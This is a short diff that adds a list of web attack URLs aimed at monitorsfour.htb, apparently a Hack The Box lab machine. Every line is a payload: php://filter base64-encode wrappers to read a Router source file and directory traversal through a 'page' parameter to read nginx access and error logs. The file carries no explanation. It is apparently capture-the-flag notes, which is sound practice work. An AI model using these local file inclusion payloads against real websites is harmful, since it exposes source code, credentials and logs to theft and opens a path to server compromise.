@@ -1,0 +1,11 @@
+http://monitorsfour.htb/php://filter/convert.base64-encode/resource=../Router
+
+
+http://monitorsfour.htb/php://filter/convert.base64-encode/resource=views/../Router
+
+
+http://monitorsfour.htb/contact?page=../../../../../../var/log/nginx/access.log
+
+
+http://monitorsfour.htb/contact?page=../../../../../../var/log/nginx/error.log
+
